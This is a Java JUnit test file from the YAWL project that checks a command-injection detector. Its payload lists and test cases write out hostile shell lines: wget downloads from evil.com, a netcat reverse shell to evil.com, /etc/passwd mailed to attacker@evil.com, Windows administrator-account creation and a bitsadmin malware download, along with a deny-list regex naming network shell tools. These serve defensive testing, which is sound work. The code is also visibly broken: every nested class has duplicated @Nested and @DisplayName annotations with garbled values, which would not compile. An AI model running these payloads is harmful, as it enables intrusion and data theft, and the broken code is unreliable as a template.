/*
 * Copyright (c) 2004-2026 The YAWL Foundation. All rights reserved.
 * The YAWL Foundation is a collaboration of individuals and
 * organisations who are committed to improving workflow technology.
 *
 * This file is part of YAWL. YAWL is free software: you can
 * redistribute it and/or modify it under the terms of the GNU Lesser
 * General Public License as published by the Free Software Foundation.
 *
 * YAWL is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General
 * Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with YAWL. If not, see <http://www.gnu.org/licenses/>.
 */

package org.yawlfoundation.yawl.security;

import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Comprehensive command injection protection tests.
 *
 * <p>Tests OWASP Top 10 A03:2021 - Injection attacks targeting command execution.
 * Validates that shell metacharacters and command injection patterns are properly
 * detected and sanitized.</p>
 *
 * <p>Chicago TDD: Real command injection pattern detection.
 * No mocks, no stubs, no placeholder implementations.</p>
 *
 * @author YAWL Development Team
 * @since 6.0
 */
@DisplayName("Command Injection Protection Tests")
@Tag("unit")
public class CommandInjectionProtectionTest {

    /**
     * Pattern to detect shell metacharacters used in command injection.
     */
    private static final Pattern SHELL_METACHAR_PATTERN = Pattern.compile(
            "[;&|`$()\\[\\]{}\\\\!<>]" +
            "|\\$\\(" +                         // Command substitution $(...)
            "|`[^`]+`" +                        // Backtick command substitution
            "|\\|\\|" +                         // OR operator
            "|&&" +                             // AND operator
            "|>>" +                             // Append redirection
            "|<<\\s*EOF" +                      // Here document
            "|\\$\\{[^}]+\\}" +                 // Variable expansion ${...}
            "|\\$[A-Za-z_][A-Za-z0-9_]*" +      // Variable expansion $VAR
            "|\\|\\s*\\w+" +                    // Pipe to command
            "|;\\s*\\w+" +                      // Semicolon followed by command
            "|&\\s*\\w+"                        // Background execution
    );

    /**
     * Pattern to detect common dangerous commands.
     */
    private static final Pattern DANGEROUS_COMMAND_PATTERN = Pattern.compile(
            "(?i)\\b(rm|del|format|fdisk|mkfs|dd|shutdown|reboot|init|halt|" +
            "passwd|su|sudo|chmod|chown|chgrp|useradd|userdel|groupadd|" +
            "netstat|ifconfig|ipconfig|route|iptables|firewall-cmd|" +
            "nc|netcat|ncat|telnet|ssh|scp|sftp|ftp|tftp|" +
            "wget|curl|lynx|links|" +
            "python|perl|ruby|php|node|java -exec|" +
            "eval|exec|system|shell_exec|passthru|popen|" +
            "crontab|at|batch|" +
            "service|systemctl|chkconfig|launchctl|" +
            "cat|head|tail|less|more|vi|vim|nano|ed|" +
            "mysql|psql|sqlplus|sqlite|" +
            "tar|zip|unzip|gzip|gunzip|bzip2|7z|" +
            "openssl|xargs|awk|sed|cut|sort|uniq|grep|find|locate)\\b"
    );

    /**
     * Common command injection payloads.
     */
    private static final List<String> COMMAND_INJECTION_PAYLOADS = Arrays.asList(
            // Semicolon injection
            "; ls",
            "; ls -la",
            "; cat /etc/passwd",
            "; id",
            "; whoami",
            "; rm -rf /",
            "; wget http://evil.com/malware.sh",

            // Pipe injection
            "| ls",
            "| cat /etc/passwd",
            "| id",
            "| nc -e /bin/sh evil.com 4444",

            // AND operator injection
            "&& ls",
            "&& cat /etc/passwd",
            "&& whoami",

            // OR operator injection
            "|| ls",
            "|| cat /etc/passwd",

            // Backtick command substitution
            "`whoami`",
            "`id`",
            "`cat /etc/passwd`",
            "`wget http://evil.com/shell.sh`",

            // Dollar-sign command substitution
            "$(whoami)",
            "$(id)",
            "$(cat /etc/passwd)",
            "$(wget http://evil.com/shell.sh)",

            // Newline injection
            "\nls",
            "\nwhoami",
            "\r\nid",

            // Background execution
            "& ls",
            "& sleep 100",

            // Redirection abuse
            "> /etc/passwd",
            ">> /etc/passwd",
            "< /etc/passwd",

            // Combined attacks
            "; rm -rf / && wget http://evil.com/shell.sh",
            "| nc -e /bin/sh evil.com 4444 &",
            "$(cat /etc/passwd | mail attacker@evil.com)"
    );

    /**
     * Environment variable injection payloads.
     */
    private static final List<String> ENV_INJECTION_PAYLOADS = Arrays.asList(
            "$PATH",
            "$HOME",
            "$USER",
            "$PWD",
            "$SHELL",
            "${PATH}",
            "${HOME}",
            "${IFS}cat${IFS}/etc/passwd",
            "$((1+1))",
            "$(())"
    );

    /**
     * Windows-specific command injection payloads.
     */
    private static final List<String> WINDOWS_PAYLOADS = Arrays.asList(
            "& dir",
            "& type c:\\windows\\system32\\config\\sam",
            "| type c:\\boot.ini",
            "&& net user attacker password /add",
            "&& net localgroup administrators attacker /add",
            "&& reg export HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "& powershell -e <base64>",
            "& wmic process get name,processid",
            "&& bitsadmin /transfer job /download /priority high http://evil.com/malware.exe c:\\malware.exe"
    );

    /**
     * Validates that input does not contain shell metacharacters.
     *
     * @param input the input to validate
     * @return true if the input is safe, false if it contains metacharacters
     */
    public static boolean isInputSafeForCommand(String input) {
        if (input == null || input.isEmpty()) {
            return true;
        }
        // Check for shell metacharacters
        if (SHELL_METACHAR_PATTERN.matcher(input).find()) {
            return false;
        }
        // Check for dangerous commands
        if (DANGEROUS_COMMAND_PATTERN.matcher(input).find()) {
            return false;
        }
        // Check for newline characters (command separator on some systems)
        if (input.contains("\n") || input.contains("\r")) {
            return false;
        }
        return input.length() <= 1000;
    }

    /**
     * Sanitizes input by removing shell metacharacters.
     * For alphanumeric input only - throws exception for dangerous content.
     *
     * @param input the input to sanitize
     * @return the sanitized input
     * @throws IllegalArgumentException if the input cannot be safely sanitized
     */
    public static String sanitizeForCommand(String input) {
        if (input == null) {
            throw new IllegalArgumentException("Input cannot be null");
        }
        if (!isInputSafeForCommand(input)) {
            throw new IllegalArgumentException("Input contains shell metacharacters and cannot be safely sanitized: " + input);
        }
        // Additional sanitization: remove any remaining suspicious characters
        String sanitized = input.replaceAll("[^a-zA-Z0-9._-]", "");
        if (sanitized.isEmpty()) {
            throw new IllegalArgumentException("Input contains no safe characters after sanitization");
        }
        return sanitized;
    }

    /**
     * Escapes shell metacharacters in a string for safe use in shell commands.
     * Uses single-quote escaping which is the safest approach for Unix shells.
     *
     * @param input the input to escape
     * @return the escaped string suitable for shell use
     */
    public static String escapeShellArg(String input) {
        if (input == null) {
            throw new IllegalArgumentException("Input cannot be null");
        }
        // Single quotes prevent all shell interpretation except single quotes themselves
        // Replace single quotes with '\'' (end quote, escaped quote, start quote)
        return "'" + input.replace("'", "'\\''") + "'";
    }

    /**
     * Validates an argument array for use with ProcessBuilder.
     * Each argument should be a single token without injection patterns.
     *
     * @param args the argument array to validate
     * @return true if all arguments are safe
     */
    public static boolean areArgumentsSafe(String[] args) {
        if (args == null) {
            return true;
        }
        for (String arg : args) {
            if (!isInputSafeForCommand(arg)) {
                return false;
            }
        }
        return true;
    }

    /**
     * Builds a safe argument list, throwing if any argument is unsafe.
     *
     * @param args the arguments to validate and build
     * @return a list of validated arguments
     * @throws IllegalArgumentException if any argument is unsafe
     */
    public static List<String> buildSafeArguments(String... args) {
        if (args == null) {
            return new ArrayList<>();
        }
        List<String> safeArgs = new ArrayList<>();
        for (String arg : args) {
            if (!isInputSafeForCommand(arg)) {
                throw new IllegalArgumentException("Unsafe argument detected: " + arg);
            }
            safeArgs.add(arg);
        }
        return safeArgs;
    }

    @Nested
    @DisplayName("Semicolon Injection Tests")
    @Nested
    @DisplayName("class SemicolonInjectionTests {")
    class SemicolonInjectionTests {

        @Test
        @DisplayName("Should detect semicolon followed by command")
        void shouldDetectSemicolonFollowedByCommand() {
            String payload = "; ls";
            assertFalse(isInputSafeForCommand(payload),
                    "Semicolon followed by command must be detected");
        }

        @Test
        @DisplayName("Should detect semicolon with ls -la")
        void shouldDetectSemicolonWithLsLa() {
            String payload = "; ls -la";
            assertFalse(isInputSafeForCommand(payload),
                    "Semicolon with ls -la must be detected");
        }

        @Test
        @DisplayName("Should detect semicolon with cat /etc/passwd")
        void shouldDetectSemicolonWithCatPasswd() {
            String payload = "; cat /etc/passwd";
            assertFalse(isInputSafeForCommand(payload),
                    "Semicolon with cat /etc/passwd must be detected");
        }

        @Test
        @DisplayName("Should detect semicolon with whoami")
        void shouldDetectSemicolonWithWhoami() {
            String payload = "; whoami";
            assertFalse(isInputSafeForCommand(payload),
                    "Semicolon with whoami must be detected");
        }

        @Test
        @DisplayName("Should detect semicolon with rm -rf")
        void shouldDetectSemicolonWithRmRf() {
            String payload = "; rm -rf /";
            assertFalse(isInputSafeForCommand(payload),
                    "Semicolon with rm -rf must be detected");
        }
    }

    @Nested
    @DisplayName("Pipe Injection Tests")
    @Nested
    @DisplayName("class PipeInjectionTests {")
    class PipeInjectionTests {

        @Test
        @DisplayName("Should detect pipe followed by command")
        void shouldDetectPipeFollowedByCommand() {
            String payload = "| ls";
            assertFalse(isInputSafeForCommand(payload),
                    "Pipe followed by command must be detected");
        }

        @Test
        @DisplayName("Should detect pipe with cat /etc/passwd")
        void shouldDetectPipeWithCatPasswd() {
            String payload = "| cat /etc/passwd";
            assertFalse(isInputSafeForCommand(payload),
                    "Pipe with cat /etc/passwd must be detected");
        }

        @Test
        @DisplayName("Should detect pipe with netcat")
        void shouldDetectPipeWithNetcat() {
            String payload = "| nc -e /bin/sh evil.com 4444";
            assertFalse(isInputSafeForCommand(payload),
                    "Pipe with netcat must be detected");
        }

        @Test
        @DisplayName("Should detect OR operator")
        void shouldDetectOrOperator() {
            String payload = "|| ls";
            assertFalse(isInputSafeForCommand(payload),
                    "OR operator must be detected");
        }
    }

    @Nested
    @DisplayName("Command Substitution Tests")
    @Nested
    @DisplayName("class CommandSubstitutionTests {")
    class CommandSubstitutionTests {

        @Test
        @DisplayName("Should detect backtick command substitution")
        void shouldDetectBacktickSubstitution() {
            String payload = "`whoami`";
            assertFalse(isInputSafeForCommand(payload),
                    "Backtick command substitution must be detected");
        }

        @Test
        @DisplayName("Should detect backtick with cat")
        void shouldDetectBacktickWithCat() {
            String payload = "`cat /etc/passwd`";
            assertFalse(isInputSafeForCommand(payload),
                    "Backtick with cat must be detected");
        }

        @Test
        @DisplayName("Should detect dollar-sign command substitution")
        void shouldDetectDollarSignSubstitution() {
            String payload = "$(whoami)";
            assertFalse(isInputSafeForCommand(payload),
                    "Dollar-sign command substitution must be detected");
        }

        @Test
        @DisplayName("Should detect dollar-sign with cat")
        void shouldDetectDollarSignWithCat() {
            String payload = "$(cat /etc/passwd)";
            assertFalse(isInputSafeForCommand(payload),
                    "Dollar-sign with cat must be detected");
        }

        @Test
        @DisplayName("Should detect dollar-sign with wget")
        void shouldDetectDollarSignWithWget() {
            String payload = "$(wget http://evil.com/shell.sh)";
            assertFalse(isInputSafeForCommand(payload),
                    "Dollar-sign with wget must be detected");
        }
    }

    @Nested
    @DisplayName("Environment Variable Injection Tests")
    @Nested
    @DisplayName("class EnvironmentVariableTests {")
    class EnvironmentVariableTests {

        @Test
        @DisplayName("Should detect $PATH expansion")
        void shouldDetectPathExpansion() {
            String payload = "$PATH";
            assertFalse(isInputSafeForCommand(payload),
                    "$PATH expansion must be detected");
        }

        @Test
        @DisplayName("Should detect $HOME expansion")
        void shouldDetectHomeExpansion() {
            String payload = "$HOME";
            assertFalse(isInputSafeForCommand(payload),
                    "$HOME expansion must be detected");
        }

        @Test
        @DisplayName("Should detect ${PATH} expansion")
        void shouldDetectBracedPathExpansion() {
            String payload = "${PATH}";
            assertFalse(isInputSafeForCommand(payload),
                    "${PATH} expansion must be detected");
        }

        @Test
        @DisplayName("Should detect IFS abuse")
        void shouldDetectIfsAbuse() {
            String payload = "${IFS}cat${IFS}/etc/passwd";
            assertFalse(isInputSafeForCommand(payload),
                    "IFS abuse must be detected");
        }
    }

    @Nested
    @DisplayName("AND/OR Operator Tests")
    @Nested
    @DisplayName("class AndOrOperatorTests {")
    class AndOrOperatorTests {

        @Test
        @DisplayName("Should detect AND operator")
        void shouldDetectAndOperator() {
            String payload = "&& ls";
            assertFalse(isInputSafeForCommand(payload),
                    "AND operator must be detected");
        }

        @Test
        @DisplayName("Should detect AND with cat")
        void shouldDetectAndWithCat() {
            String payload = "&& cat /etc/passwd";
            assertFalse(isInputSafeForCommand(payload),
                    "AND with cat must be detected");
        }

        @Test
        @DisplayName("Should detect combined AND/OR attack")
        void shouldDetectCombinedAndOrAttack() {
            String payload = "; rm -rf / && wget http://evil.com/shell.sh";
            assertFalse(isInputSafeForCommand(payload),
                    "Combined AND/OR attack must be detected");
        }
    }

    @Nested
    @DisplayName("Redirection Abuse Tests")
    @Nested
    @DisplayName("class RedirectionTests {")
    class RedirectionTests {

        @Test
        @DisplayName("Should detect output redirection")
        void shouldDetectOutputRedirection() {
            String payload = "> /etc/passwd";
            assertFalse(isInputSafeForCommand(payload),
                    "Output redirection must be detected");
        }

        @Test
        @DisplayName("Should detect append redirection")
        void shouldDetectAppendRedirection() {
            String payload = ">> /etc/passwd";
            assertFalse(isInputSafeForCommand(payload),
                    "Append redirection must be detected");
        }

        @Test
        @DisplayName("Should detect input redirection")
        void shouldDetectInputRedirection() {
            String payload = "< /etc/passwd";
            assertFalse(isInputSafeForCommand(payload),
                    "Input redirection must be detected");
        }
    }

    @Nested
    @DisplayName("Newline Injection Tests")
    @Nested
    @DisplayName("class NewlineInjectionTests {")
    class NewlineInjectionTests {

        @Test
        @DisplayName("Should detect newline with command")
        void shouldDetectNewlineWithCommand() {
            String payload = "\nls";
            assertFalse(isInputSafeForCommand(payload),
                    "Newline with command must be detected");
        }

        @Test
        @DisplayName("Should detect CRLF with command")
        void shouldDetectCrlfWithCommand() {
            String payload = "\r\nid";
            assertFalse(isInputSafeForCommand(payload),
                    "CRLF with command must be detected");
        }

        @Test
        @DisplayName("Should detect newline with whoami")
        void shouldDetectNewlineWithWhoami() {
            String payload = "\nwhoami";
            assertFalse(isInputSafeForCommand(payload),
                    "Newline with whoami must be detected");
        }
    }

    @Nested
    @DisplayName("Background Execution Tests")
    @Nested
    @DisplayName("class BackgroundExecutionTests {")
    class BackgroundExecutionTests {

        @Test
        @DisplayName("Should detect background execution")
        void shouldDetectBackgroundExecution() {
            String payload = "& ls";
            assertFalse(isInputSafeForCommand(payload),
                    "Background execution must be detected");
        }

        @Test
        @DisplayName("Should detect background with sleep")
        void shouldDetectBackgroundWithSleep() {
            String payload = "& sleep 100";
            assertFalse(isInputSafeForCommand(payload),
                    "Background with sleep must be detected");
        }
    }

    @Nested
    @DisplayName("Windows-Specific Tests")
    @Nested
    @DisplayName("class WindowsSpecificTests {")
    class WindowsSpecificTests {

        @Test
        @DisplayName("Should detect Windows & operator")
        void shouldDetectWindowsAndOperator() {
            String payload = "& dir";
            assertFalse(isInputSafeForCommand(payload),
                    "Windows & operator must be detected");
        }

        @Test
        @DisplayName("Should detect Windows type command")
        void shouldDetectWindowsTypeCommand() {
            String payload = "& type c:\\windows\\system32\\config\\sam";
            assertFalse(isInputSafeForCommand(payload),
                    "Windows type command must be detected");
        }

        @Test
        @DisplayName("Should detect Windows net user")
        void shouldDetectWindowsNetUser() {
            String payload = "&& net user attacker password /add";
            assertFalse(isInputSafeForCommand(payload),
                    "Windows net user must be detected");
        }

        @Test
        @DisplayName("Should detect Windows PowerShell")
        void shouldDetectWindowsPowerShell() {
            String payload = "& powershell -e <base64>";
            assertFalse(isInputSafeForCommand(payload),
                    "Windows PowerShell must be detected");
        }
    }

    @Nested
    @DisplayName("Dangerous Command Detection Tests")
    @Nested
    @DisplayName("class DangerousCommandTests {")
    class DangerousCommandTests {

        @Test
        @DisplayName("Should detect rm command")
        void shouldDetectRmCommand() {
            String payload = "rm -rf /";
            assertFalse(isInputSafeForCommand(payload),
                    "rm command must be detected");
        }

        @Test
        @DisplayName("Should detect wget command")
        void shouldDetectWgetCommand() {
            String payload = "wget http://evil.com/malware";
            assertFalse(isInputSafeForCommand(payload),
                    "wget command must be detected");
        }

        @Test
        @DisplayName("Should detect nc/netcat command")
        void shouldDetectNetcatCommand() {
            String payload = "nc -e /bin/sh evil.com 4444";
            assertFalse(isInputSafeForCommand(payload),
                    "netcat command must be detected");
        }

        @Test
        @DisplayName("Should detect chmod command")
        void shouldDetectChmodCommand() {
            String payload = "chmod 777 /etc/passwd";
            assertFalse(isInputSafeForCommand(payload),
                    "chmod command must be detected");
        }

        @Test
        @DisplayName("Should detect sudo command")
        void shouldDetectSudoCommand() {
            String payload = "sudo su -";
            assertFalse(isInputSafeForCommand(payload),
                    "sudo command must be detected");
        }
    }

    @Nested
    @DisplayName("Sanitization Tests")
    @Nested
    @DisplayName("class SanitizationTests {")
    class SanitizationTests {

        @Test
        @DisplayName("Should preserve safe alphanumeric input")
        void shouldPreserveSafeAlphanumeric() {
            String input = "filename123";
            assertEquals("filename123", sanitizeForCommand(input),
                    "Safe alphanumeric input should be preserved");
        }

        @Test
        @DisplayName("Should preserve dots, underscores, and hyphens")
        void shouldPreserveSafeCharacters() {
            String input = "my-file_name.txt";
            assertEquals("my-file_name.txt", sanitizeForCommand(input),
                    "Safe characters should be preserved");
        }

        @Test
        @DisplayName("Should reject input with semicolon")
        void shouldRejectInputWithSemicolon() {
            String input = "file;rm -rf /";
            assertThrows(IllegalArgumentException.class, () -> sanitizeForCommand(input),
                    "Input with semicolon must be rejected");
        }

        @Test
        @DisplayName("Should reject input with pipe")
        void shouldRejectInputWithPipe() {
            String input = "file|cat";
            assertThrows(IllegalArgumentException.class, () -> sanitizeForCommand(input),
                    "Input with pipe must be rejected");
        }

        @Test
        @DisplayName("Should reject null input")
        void shouldRejectNullInput() {
            assertThrows(IllegalArgumentException.class, () -> sanitizeForCommand(null),
                    "Null input must throw IllegalArgumentException");
        }

        @Test
        @DisplayName("Should reject input with only unsafe characters")
        void shouldRejectOnlyUnsafeCharacters() {
            assertThrows(IllegalArgumentException.class, () -> sanitizeForCommand(";|&"),
                    "Input with only unsafe characters must be rejected");
        }
    }

    @Nested
    @DisplayName("Shell Escape Tests")
    @Nested
    @DisplayName("class ShellEscapeTests {")
    class ShellEscapeTests {

        @Test
        @DisplayName("Should wrap simple string in quotes")
        void shouldWrapSimpleStringInQuotes() {
            String escaped = escapeShellArg("hello");
            assertEquals("'hello'", escaped,
                    "Simple string should be wrapped in single quotes");
        }

        @Test
        @DisplayName("Should escape single quotes")
        void shouldEscapeSingleQuotes() {
            String escaped = escapeShellArg("it's");
            assertEquals("'it'\\''s'", escaped,
                    "Single quotes should be escaped correctly");
        }

        @Test
        @DisplayName("Should handle string with spaces")
        void shouldHandleStringWithSpaces() {
            String escaped = escapeShellArg("hello world");
            assertEquals("'hello world'", escaped,
                    "String with spaces should be wrapped correctly");
        }

        @Test
        @DisplayName("Should handle string with special chars")
        void shouldHandleStringWithSpecialChars() {
            String escaped = escapeShellArg("file;rm -rf /");
            assertEquals("'file;rm -rf /'", escaped,
                    "Special chars should be safely contained in quotes");
        }

        @Test
        @DisplayName("Should reject null for shell escape")
        void shouldRejectNullForShellEscape() {
            assertThrows(IllegalArgumentException.class, () -> escapeShellArg(null),
                    "Null input must throw IllegalArgumentException");
        }
    }

    @Nested
    @DisplayName("Argument Array Validation Tests")
    @Nested
    @DisplayName("class ArgumentArrayTests {")
    class ArgumentArrayTests {

        @Test
        @DisplayName("Should accept safe argument array")
        void shouldAcceptSafeArgumentArray() {
            String[] args = {"command", "arg1", "arg2"};
            assertTrue(areArgumentsSafe(args),
                    "Safe argument array should be accepted");
        }

        @Test
        @DisplayName("Should reject argument array with injection")
        void shouldRejectArgumentArrayWithInjection() {
            String[] args = {"command", "; rm -rf /", "arg2"};
            assertFalse(areArgumentsSafe(args),
                    "Argument array with injection must be rejected");
        }

        @Test
        @DisplayName("Should accept null argument array")
        void shouldAcceptNullArgumentArray() {
            assertTrue(areArgumentsSafe(null),
                    "Null argument array should be considered safe");
        }

        @Test
        @DisplayName("Should build safe arguments list")
        void shouldBuildSafeArgumentsList() {
            List<String> safeArgs = buildSafeArguments("cmd", "arg1", "arg2");
            assertEquals(3, safeArgs.size(),
                    "Safe arguments list should have correct size");
        }

        @Test
        @DisplayName("Should throw when building unsafe arguments")
        void shouldThrowWhenBuildingUnsafeArguments() {
            assertThrows(IllegalArgumentException.class,
                    () -> buildSafeArguments("cmd", "; rm -rf /"),
                    "Building unsafe arguments must throw");
        }
    }

    @Nested
    @DisplayName("Safe Input Acceptance Tests")
    @Nested
    @DisplayName("class SafeInputTests {")
    class SafeInputTests {

        @Test
        @DisplayName("Should accept simple alphanumeric")
        void shouldAcceptSimpleAlphanumeric() {
            assertTrue(isInputSafeForCommand("simple123"),
                    "Simple alphanumeric should be accepted");
        }

        @Test
        @DisplayName("Should accept filename with extension")
        void shouldAcceptFilenameWithExtension() {
            assertTrue(isInputSafeForCommand("document.pdf"),
                    "Filename with extension should be accepted");
        }

        @Test
        @DisplayName("Should accept path-like string without injection")
        void shouldAcceptPathLikeString() {
            assertTrue(isInputSafeForCommand("folder/subfolder/file.txt"),
                    "Path-like string should be accepted");
        }

        @Test
        @DisplayName("Should accept null input")
        void shouldAcceptNullInput() {
            assertTrue(isInputSafeForCommand(null),
                    "Null should be considered safe");
        }

        @Test
        @DisplayName("Should accept empty string")
        void shouldAcceptEmptyString() {
            assertTrue(isInputSafeForCommand(""),
                    "Empty string should be considered safe");
        }

        @Test
        @DisplayName("Should accept UUID format")
        void shouldAcceptUuidFormat() {
            assertTrue(isInputSafeForCommand("550e8400-e29b-41d4-a716-446655440000"),
                    "UUID format should be accepted");
        }
    }

    @Nested
    @DisplayName("Edge Cases and Boundary Tests")
    @Nested
    @DisplayName("class EdgeCaseTests {")
    class EdgeCaseTests {

        @Test
        @DisplayName("Should reject excessively long input")
        void shouldRejectExcessivelyLongInput() {
            StringBuilder sb = new StringBuilder();
            sb.append("a".repeat(1001));
            assertFalse(isInputSafeForCommand(sb.toString()),
                    "Input longer than 1000 characters should be rejected");
        }

        @Test
        @DisplayName("Should accept input at length limit")
        void shouldAcceptInputAtLengthLimit() {
            StringBuilder sb = new StringBuilder();
            sb.append("a".repeat(1000));
            assertTrue(isInputSafeForCommand(sb.toString()),
                    "Input at exactly 1000 characters should be accepted");
        }

        @Test
        @DisplayName("Should handle unicode characters")
        void shouldHandleUnicodeCharacters() {
            assertTrue(isInputSafeForCommand("task_\u4e2d\u6587"),
                    "Unicode characters should be handled safely");
        }

        @Test
        @DisplayName("Should detect injection with leading spaces")
        void shouldDetectInjectionWithLeadingSpaces() {
            String payload = "   ; ls";
            assertFalse(isInputSafeForCommand(payload),
                    "Injection with leading spaces must be detected");
        }

        @Test
        @DisplayName("Should detect injection at end of string")
        void shouldDetectInjectionAtEndOfString() {
            String payload = "normal; ls";
            assertFalse(isInputSafeForCommand(payload),
                    "Injection at end of string must be detected");
        }
    }
}
